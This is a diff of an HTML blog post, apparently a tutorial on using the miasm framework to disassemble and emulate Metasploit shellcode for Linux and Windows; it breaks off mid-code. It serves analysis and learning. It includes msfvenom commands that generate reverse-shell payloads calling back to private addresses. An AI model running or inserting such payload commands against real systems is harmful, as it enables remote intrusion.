@@ -35,7 +35,7 @@
 
   
     
-    <link rel="stylesheet" href="/css/post.min.a0cc38240cf70273eb11de857cd55c451ee90d88fad21f0e52d9ff1d0982ded2.css" integrity="sha256-oMw4JAz3AnPrEd6FfNVcRR7pDYj60h8OUtn/HQmC3tI="/>
+    <link rel="stylesheet" href="/css/post.min.b55e48a57c205580facfa82070761940c943e10b594ebdb023151ba0ff1d16cc.css" integrity="sha256-tV5IpXwgVYD6z6ggcHYZQMlD4QtZTr2wIxUboP8dFsw="/>
   
     
     <link rel="stylesheet" href="/css/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="/>
@@ -143,9 +143,9 @@
 <p>Shellcodes are an interesting piece of software because they have to run with unusual constraints. They are also small enough to be used to learn new tools. I have been wanting to learn to use <a href="https://github.com/cea-sec/miasm">miasm</a> for a long time (since I saw the first presentation at SSTIC some years ago), I finally used a few nights of confinement to learn that, here is a short summary.</p>
 <h2 id="linux-shellcode">Linux shellcode<a class="anchor" href="#linux-shellcode">#</a></h2>
 <p>Let&rsquo;s start with a Linux shellcode as they are less complex than Windows shellcodes.</p>
-<pre><code>msfvenom -p linux/x86/exec CMD=/bin/ls -a x86 --platform linux -f raw &gt; sc_linux1
+<pre tabindex="0"><code>msfvenom -p linux/x86/exec CMD=/bin/ls -a x86 --platform linux -f raw &gt; sc_linux1
 </code></pre><p>Let&rsquo;s disassemble the shellcode with miasm :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.analysis.binary <span style="color:#f92672">import</span> Container
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.analysis.binary <span style="color:#f92672">import</span> Container
 <span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
 
 <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;sc_linux1&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
@@ -154,12 +154,12 @@
 container <span style="color:#f92672">=</span> Container<span style="color:#f92672">.</span>from_string(buf)
 machine <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#39;x86_32&#39;</span>)
 mdis <span style="color:#f92672">=</span> machine<span style="color:#f92672">.</span>dis_engine(container<span style="color:#f92672">.</span>bin_stream)
-mdis<span style="color:#f92672">.</span>follow_call <span style="color:#f92672">=</span> True <span style="color:#75715e"># Follow calls</span>
-mdis<span style="color:#f92672">.</span>dontdis_retcall <span style="color:#f92672">=</span> True <span style="color:#75715e"># Don&#39;t disassemble after calls</span>
+mdis<span style="color:#f92672">.</span>follow_call <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span> <span style="color:#75715e"># Follow calls</span>
+mdis<span style="color:#f92672">.</span>dontdis_retcall <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span> <span style="color:#75715e"># Don&#39;t disassemble after calls</span>
 disasm <span style="color:#f92672">=</span> mdis<span style="color:#f92672">.</span>dis_multiblock(offset<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
-<span style="color:#66d9ef">print</span>(disasm)
+print(disasm)
 </code></pre></div><p>And we get the following code :</p>
-<pre><code>loc_key_0
+<pre tabindex="0"><code>loc_key_0
 PUSH       0xB
 POP        EAX
 CDQ
@@ -179,13 +179,13 @@ MOV        ECX, ESP
 INT        0x80
 [SNIP]
 </code></pre><p>Nothing really surprising here, INT 0x80 is calling the system and the syscall code is moved to EAX on the first line, 0xB being the code for <code>execve</code>. We can easily get the address of the data after the <code>CALL loc_key_1</code> by taking the data between the instruction address + size and the address of <code>loc_key1</code> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">&gt;</span> inst <span style="color:#f92672">=</span> list(disasm<span style="color:#f92672">.</span>blocks)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>lines[<span style="color:#ae81ff">10</span>] <span style="color:#75715e"># Instruction 10 of block 0</span>
-<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">print</span>(buf[inst<span style="color:#f92672">.</span>offset<span style="color:#f92672">+</span>inst<span style="color:#f92672">.</span>l:disasm<span style="color:#f92672">.</span>loc_db<span style="color:#f92672">.</span>offsets[<span style="color:#ae81ff">1</span>]])
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">&gt;</span> inst <span style="color:#f92672">=</span> list(disasm<span style="color:#f92672">.</span>blocks)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>lines[<span style="color:#ae81ff">10</span>] <span style="color:#75715e"># Instruction 10 of block 0</span>
+<span style="color:#f92672">&gt;</span> print(buf[inst<span style="color:#f92672">.</span>offset<span style="color:#f92672">+</span>inst<span style="color:#f92672">.</span>l:disasm<span style="color:#f92672">.</span>loc_db<span style="color:#f92672">.</span>offsets[<span style="color:#ae81ff">1</span>]])
 <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/ls</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
 </code></pre></div><p>Let&rsquo;s get a more complex shellcode :</p>
-<pre><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.2.2.14 LPORT=1234 -f raw &gt; sc_linux2
+<pre tabindex="0"><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.2.2.14 LPORT=1234 -f raw &gt; sc_linux2
 </code></pre><p>This one has conditional jumps in the code, so it is easier to read it as a graph :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.analysis.binary <span style="color:#f92672">import</span> Container
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.analysis.binary <span style="color:#f92672">import</span> Container
 <span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
 
 <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;sc_linux2&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
@@ -194,17 +194,16 @@ INT        0x80
 container <span style="color:#f92672">=</span> Container<span style="color:#f92672">.</span>from_string(buf)
 machine <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#39;x86_32&#39;</span>)
 mdis <span style="color:#f92672">=</span> machine<span style="color:#f92672">.</span>dis_engine(container<span style="color:#f92672">.</span>bin_stream)
-mdis<span style="color:#f92672">.</span>follow_call <span style="color:#f92672">=</span> True <span style="color:#75715e"># Follow calls</span>
-mdis<span style="color:#f92672">.</span>dontdis_retcall <span style="color:#f92672">=</span> True <span style="color:#75715e"># Don&#39;t disassemble after calls</span>
+mdis<span style="color:#f92672">.</span>follow_call <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span> <span style="color:#75715e"># Follow calls</span>
+mdis<span style="color:#f92672">.</span>dontdis_retcall <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span> <span style="color:#75715e"># Don&#39;t disassemble after calls</span>
 disasm <span style="color:#f92672">=</span> mdis<span style="color:#f92672">.</span>dis_multiblock(offset<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
 open(<span style="color:#e6db74">&#39;bin_cfg.dot&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(disasm<span style="color:#f92672">.</span>dot())
-</code></pre></div><figure class="center">
-    <img src="/media/miasm/graph1.png" width="350"/> 
+</code></pre></div><figure class="center"><img src="/media/miasm/graph1.png" width="350"/>
 </figure>
 
 <p>This is a bit more work to understand statically, so let&rsquo;s see if we can emulate it with miasm.</p>
 <p>It is pretty easy to emulate instructions :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
 <span style="color:#f92672">from</span> miasm.jitter.csts <span style="color:#f92672">import</span> PAGE_READ, PAGE_WRITE
 
 myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
@@ -216,7 +215,7 @@ myjit<span style="color:#f92672">.</span>vm<span style="color:#f92672">.</span>a
 myjit<span style="color:#f92672">.</span>set_trace_log()
 myjit<span style="color:#f92672">.</span>run(run_addr)
 </code></pre></div><p>Miasm emulates all the instructions until we reach the first int 0x80 call :</p>
-<pre><code>40000000 PUSH       0xA
+<pre tabindex="0"><code>40000000 PUSH       0xA
 EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 00000000 EDI 00000000 ESP 0123FFFC EBP 00000000 EIP 40000002 zf 0 nf 0 of 0 cf 0
 40000002 POP        ESI
 EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 0000000A EDI 00000000 ESP 01240000 EBP 00000000 EIP 40000003 zf 0 nf 0 of 0 cf 0
@@ -234,12 +233,12 @@ Traceback (most recent call last):
     assert(self.get_exception() == 0)
 AssertionError
 </code></pre><p>By default, the miasm machine does not execute system calls, but it is possible to add an exception handler for the exception <code>EXCEPT_INT_XX</code> (<code>EXCEPT_SYSCALL</code> for Linux x86_64) and implement it ourselves. Let&rsquo;s just print the syscall numbers first :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.jitter.csts <span style="color:#f92672">import</span> PAGE_READ, PAGE_WRITE, EXCEPT_INT_XX
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.jitter.csts <span style="color:#f92672">import</span> PAGE_READ, PAGE_WRITE, EXCEPT_INT_XX
 <span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exception_int</span>(jitter):
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Syscall: {}&#34;</span><span style="color:#f92672">.</span>format(jitter<span style="color:#f92672">.</span>cpu<span style="color:#f92672">.</span>EAX))
-    <span style="color:#66d9ef">return</span> True
+    print(<span style="color:#e6db74">&#34;Syscall: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(jitter<span style="color:#f92672">.</span>cpu<span style="color:#f92672">.</span>EAX))
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
 
 myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
 myjit<span style="color:#f92672">.</span>init_stack()
@@ -250,10 +249,10 @@ myjit<span style="color:#f92672">.</span>vm<span style="color:#f92672">.</span>a
 myjit<span style="color:#f92672">.</span>add_exception_handler(EXCEPT_INT_XX, exception_int)
 myjit<span style="color:#f92672">.</span>run(run_addr)
 </code></pre></div><p>Which gives us the syscalls :</p>
-<pre><code>Syscall: 102
+<pre tabindex="0"><code>Syscall: 102
 Syscall: 102
 </code></pre><p>I started to <a href="https://github.com/Te-k/analyst-scripts/blob/master/miasm/simu_sc_linux32.py">reimplement a few syscalls</a> often used by shellcodes before realizing that miasm had already <a href="https://github.com/cea-sec/miasm/blob/master/miasm/os_dep/linux/syscall.py#L1067">integrated several syscall implementations</a> and a method to have them executed by the virtual machine. I have submitted a PR for a few extra syscalls, and then we can emulate the shellcode :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
 myjit<span style="color:#f92672">.</span>init_stack()
 
 data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;sc_linux2&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
@@ -266,7 +265,7 @@ env <span style="color:#f92672">=</span> environment<span style="color:#f92672">
 syscall<span style="color:#f92672">.</span>enable_syscall_handling(myjit, env, syscall<span style="color:#f92672">.</span>syscall_callbacks_x86_32)
 myjit<span style="color:#f92672">.</span>run(run_addr)
 </code></pre></div><p>And we get the following syscall trace :</p>
-<pre><code>[DEBUG   ]: socket(AF_INET, SOCK_STREAM, 0)
+<pre tabindex="0"><code>[DEBUG   ]: socket(AF_INET, SOCK_STREAM, 0)
 [DEBUG   ]: -&gt; 3
 [DEBUG   ]: connect(fd, [AF_INET, 1234, 10.2.2.14], 102)
 [DEBUG   ]: -&gt; 0
@@ -277,7 +276,7 @@ myjit<span style="color:#f92672">.</span>run(run_addr)
 <h2 id="windows">Windows<a class="anchor" href="#windows">#</a></h2>
 <p>Because it is not possible to use instructions for system calls on Windows, Windows shellcodes need to use functions from shared libraries, which requires to load them with LoadLibrary and GetProcAddress, which requires to first find these two function addresses in kernel32.dll DLL file in memory.</p>
 <p>Let&rsquo;s generate a first shellcode with metasploit :</p>
-<pre><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443   -f raw &gt; sc_windows1
+<pre tabindex="0"><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443   -f raw &gt; sc_windows1
 </code></pre><p>We can generate a call graph with the exact same code used for Linux above:</p>
 <figure>
     <img src="/media/miasm/graph2.png" style="max-width:250px"/>
@@ -286,22 +285,21 @@ myjit<span style="color:#f92672">.</span>run(run_addr)
 
 <p>Here we see one of the tricks used by most shellcodes to get their own address, <code>CALL</code> is push stack the address of the next instruction to the stack, that is then stored in stored in EBP with <code>POP</code>. The <code>CALL EBP</code> at the last instruction, is thus calling the instruction just after the first call. And because only static analysis is used here, miasm cannot know which address is in EBP.</p>
 <p>We can still manually disassemble the code after the first call:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">inst <span style="color:#f92672">=</span> inst <span style="color:#f92672">=</span> list(disasm<span style="color:#f92672">.</span>blocks)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>lines[<span style="color:#ae81ff">1</span>] <span style="color:#75715e"># We get the second line of the first block</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">inst <span style="color:#f92672">=</span> inst <span style="color:#f92672">=</span> list(disasm<span style="color:#f92672">.</span>blocks)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>lines[<span style="color:#ae81ff">1</span>] <span style="color:#75715e"># We get the second line of the first block</span>
 next_addr <span style="color:#f92672">=</span> inst<span style="color:#f92672">.</span>offset <span style="color:#f92672">+</span> inst<span style="color:#f92672">.</span>l <span style="color:#75715e"># offset + size of the instruction</span>
 disasm <span style="color:#f92672">=</span> mdis<span style="color:#f92672">.</span>dis_multiblock(offset<span style="color:#f92672">=</span>next_addr)
 open(<span style="color:#e6db74">&#39;bin_cfg.dot&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(disasm<span style="color:#f92672">.</span>dot())
-</code></pre></div><figure class="center">
-    <img src="/media/miasm/graph3.png" width="350"/> 
+</code></pre></div><figure class="center"><img src="/media/miasm/graph3.png" width="350"/>
 </figure>
 
 <p>Here we see that the shellcode is first looking for the address of kernel32 by following <code>PEB</code>, <code>PEB_LDR_DATA</code> and <code>LDR_DATA_TABLE_ENTRY</code> structures in memory. Let&rsquo;s emulate that :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.jitter.csts <span style="color:#f92672">import</span> PAGE_READ, PAGE_WRITE
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.jitter.csts <span style="color:#f92672">import</span> PAGE_READ, PAGE_WRITE
 <span style="color:#f92672">from</span> miasm.analysis.machine <span style="color:#f92672">import</span> Machine
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">code_sentinelle</span>(jitter):
-    jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">=</span> False
+    jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
     jitter<span style="color:#f92672">.</span>pc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-    <span style="color:#66d9ef">return</span> True
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
 
 myjit <span style="color:#f92672">=</span> Machine(<span style="color:#e6db74">&#34;x86_32&#34;</span>)<span style="color:#f92672">.</span>jitter(<span style="color:#e6db74">&#34;python&#34;</span>)
 myjit<span style="color:#f92672">.</span>init_stack()
@@ -312,7 +310,7 @@ myjit<span style="color:#f92672">.</span>set_trace_log()
 myjit<span style="color:#f92672">.</span>push_uint32_t(<span style="color:#ae81ff">0x1337beef</span>)
 myjit<span style="color:#f92672">.</span>add_breakpoint(<span style="color:#ae81ff">0x1337beef</span>, code_sentinelle)
 myjit<span style="color:#f92672">.</span>run(run_addr)
-</code></pre></div><pre><code>40000000 CLD
+</code></pre></div><pre tabindex="0"><code>40000000 CLD
 EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 00000000 EDI 00000000 ESP 0123FFFC EBP 00000000 EIP 40000001 zf 0 nf 0 of 0 cf 0
 40000001 CALL       loc_40000088
 EAX 00000000 EBX 00000000 ECX 00000000 EDX 00000000 ESI 00000000 EDI 00000000 ESP 0123FFF8 EBP 00000000 EIP 40000088 zf 0 nf 0 of 0 cf 0
@@ -327,7 +325,7 @@ Traceback (most recent call last):
 [SNIP]
 RuntimeError: Cannot find address
 </code></pre><p>The emulation works until it reaches <code>MOV EDX, DWORD PTR FS:[EAX + 0x30]</code>, this instructions get the TEB structure address from the FS segment in memory. But in that case, miasm is only emulating the code and has not loaded any system segment in memory. We need to use a full Windows Sandbox from miasm for that, but these VMs are only running PE files, so let&rsquo;s first use a short script using <a href="https://lief.quarkslab.com/">lief</a> to convert the shellcode to a full-figured PE file :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> lief <span style="color:#f92672">import</span> PE
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> lief <span style="color:#f92672">import</span> PE
 <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;sc_windows1&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
     data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 
@@ -339,31 +337,31 @@ section_text<span style="color:#f92672">.</span>virtual_address <span style="col
 section_text <span style="color:#f92672">=</span> binary32<span style="color:#f92672">.</span>add_section(section_text, PE<span style="color:#f92672">.</span>SECTION_TYPES<span style="color:#f92672">.</span>TEXT)
 binary32<span style="color:#f92672">.</span>optional_header<span style="color:#f92672">.</span>addressof_entrypoint <span style="color:#f92672">=</span> section_text<span style="color:#f92672">.</span>virtual_address
 builder <span style="color:#f92672">=</span> PE<span style="color:#f92672">.</span>Builder(binary32)
-builder<span style="color:#f92672">.</span>build_imports(True)
+builder<span style="color:#f92672">.</span>build_imports(<span style="color:#66d9ef">True</span>)
 builder<span style="color:#f92672">.</span>build()
 builder<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;sc_windows1.exe&#34;</span>)
 </code></pre></div><p>Let&rsquo;s now run this PE with a miasm Sandbox with the option <code>use-windows-structs</code> to load Windows structures in memory (see the code <a href="https://github.com/cea-sec/miasm/blob/b265c8af0cee47c039bad11153d1eb9ba8383f71/miasm/os_dep/win_api_x86_32_seh.py">here</a>) :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.analysis.sandbox <span style="color:#f92672">import</span> Sandbox_Win_x86_32
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> miasm.analysis.sandbox <span style="color:#f92672">import</span> Sandbox_Win_x86_32
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Options</span>():
     <span style="color:#66d9ef">def</span> __init__(self):
-        self<span style="color:#f92672">.</span>use_windows_structs <span style="color:#f92672">=</span> True
+        self<span style="color:#f92672">.</span>use_windows_structs <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
         self<span style="color:#f92672">.</span>jitter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gcc&#34;</span>
         <span style="color:#75715e">#self.singlestep = True</span>
-        self<span style="color:#f92672">.</span>usesegm <span style="color:#f92672">=</span> True
-        self<span style="color:#f92672">.</span>load_hdr <span style="color:#f92672">=</span> True
-        self<span style="color:#f92672">.</span>loadbasedll <span style="color:#f92672">=</span> True
+        self<span style="color:#f92672">.</span>usesegm <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+        self<span style="color:#f92672">.</span>load_hdr <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+        self<span style="color:#f92672">.</span>loadbasedll <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
 
     <span style="color:#66d9ef">def</span> __getattr__(self, name):
-        <span style="color:#66d9ef">return</span> None
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
 
 options <span style="color:#f92672">=</span> Options()
 <span style="color:#75715e"># Create sandbox</span>
 sb <span style="color:#f92672">=</span> Sandbox_Win_x86_32(<span style="color:#e6db74">&#34;sc_windows1.exe&#34;</span>, options, globals())
 sb<span style="color:#f92672">.</span>run()
-<span style="color:#66d9ef">assert</span>(sb<span style="color:#f92672">.</span>jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">is</span> False)
+<span style="color:#66d9ef">assert</span>(sb<span style="color:#f92672">.</span>jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">is</span> <span style="color:#66d9ef">False</span>)
 </code></pre></div><p>The option <code>loadbasedll</code> is loading DLL structures in memory based on existing dlls in a folder called <code>win_dll</code> (you need Windows x86_32 DLLs). Upon execution, we get the following crash :</p>
-<pre><code>[SNIP]
+<pre tabindex="0"><code>[SNIP]
 [INFO    ]: kernel32_LoadLibrary(dllname=0x13ffe8) ret addr: 0x40109b
 [WARNING ]: warning adding .dll to modulename
 [WARNING ]: ws2_32.dll
@@ -376,12 +374,12 @@ Traceback (most recent call last):
 ValueError: ('unknown api', '0x71ab6a55', &quot;'ws2_32_WSAStartup'&quot;)
 </code></pre><p>If we look at the file jitload.py, it actually calls DLL functions implemented in <a href="https://github.com/cea-sec/miasm/blob/master/miasm/os_dep/win_api_x86_32.py">win_api_x86_32.py</a>, and we see that <code>kernel32_LoadLibrary</code> is indeed implemented but not WSAStartup, so we need to implement it ourselves.</p>
 <p>Miasm is actually using a very smart trick to ease the implementation of new libraries, the sandbox accept a parameter for additional functions that is by default called with <code>globals()</code>. It means that we just have to define a function with the right name in our code, and it directly become available as a system function. Let&rsquo;s try that with <code>ws2_32_WSAStartup</code> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ws2_32_WSAStartup</span>(jitter):
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;WSAStartup(wVersionRequired, lpWSAData)&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ws2_32_WSAStartup</span>(jitter):
+    print(<span style="color:#e6db74">&#34;WSAStartup(wVersionRequired, lpWSAData)&#34;</span>)
     ret_ad, args <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>func_args_stdcall([<span style="color:#e6db74">&#34;wVersionRequired&#34;</span>, <span style="color:#e6db74">&#34;lpWSAData&#34;</span>])
     jitter<span style="color:#f92672">.</span>func_ret_stdcall(ret_ad, <span style="color:#ae81ff">0</span>)
 </code></pre></div><p>We now get :</p>
-<pre><code>INFO    ]: kernel32_LoadLibrary(dllname=0x13ffe8) ret addr: 0x40109b
+<pre tabindex="0"><code>INFO    ]: kernel32_LoadLibrary(dllname=0x13ffe8) ret addr: 0x40109b
 [WARNING ]: warning adding .dll to modulename
 [WARNING ]: ws2_32.dll
 WSAStartup(wVersionRequired, lpWSAData)
@@ -391,7 +389,7 @@ Traceback (most recent call last):
     raise ValueError('unknown api', hex(jitter.pc), repr(fname))
 ValueError: ('unknown api', '0x71ab8b6a', &quot;'ws2_32_WSASocketA'&quot;)
 </code></pre><p>We can continue that way and implement one by one the few functions called by the shellcode:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ws2_32_WSASocketA</span>(jitter):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ws2_32_WSASocketA</span>(jitter):
     <span style="color:#e6db74">&#34;&#34;&#34;
 </span><span style="color:#e6db74">    SOCKET WSAAPI WSASocketA(
 </span><span style="color:#e6db74">        int                 af,
@@ -406,7 +404,7 @@ ValueError: ('unknown api', '0x71ab8b6a', &quot;'ws2_32_WSASocketA'&quot;)
     TYPES <span style="color:#f92672">=</span> {<span style="color:#ae81ff">1</span>: <span style="color:#e6db74">&#34;SOCK_STREAM&#34;</span>, <span style="color:#ae81ff">2</span>: <span style="color:#e6db74">&#34;SOCK_DGRAM&#34;</span>}
     PROTOCOLS <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>: <span style="color:#e6db74">&#34;Whatever&#34;</span>, <span style="color:#ae81ff">6</span>: <span style="color:#e6db74">&#34;TCP&#34;</span>, <span style="color:#ae81ff">17</span>: <span style="color:#e6db74">&#34;UDP&#34;</span>}
     ret_ad, args <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>func_args_stdcall([<span style="color:#e6db74">&#34;af&#34;</span>, <span style="color:#e6db74">&#34;type&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>, <span style="color:#e6db74">&#34;lpProtocolInfo&#34;</span>, <span style="color:#e6db74">&#34;g&#34;</span>, <span style="color:#e6db74">&#34;dwFlags&#34;</span>])
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;WSASocketA({}, {}, {}, ...)&#34;</span><span style="color:#f92672">.</span>format(
+    print(<span style="color:#e6db74">&#34;WSASocketA(</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, ...)&#34;</span><span style="color:#f92672">.</span>format(
         ADDRESS_FAM[args<span style="color:#f92672">.</span>af],
         TYPES[args<span style="color:#f92672">.</span>type],
         PROTOCOLS[args<span style="color:#f92672">.</span>protocol]
@@ -420,9 +418,9 @@ ValueError: ('unknown api', '0x71ab8b6a', &quot;'ws2_32_WSASocketA'&quot;)
     <span style="color:#66d9ef">if</span> family <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
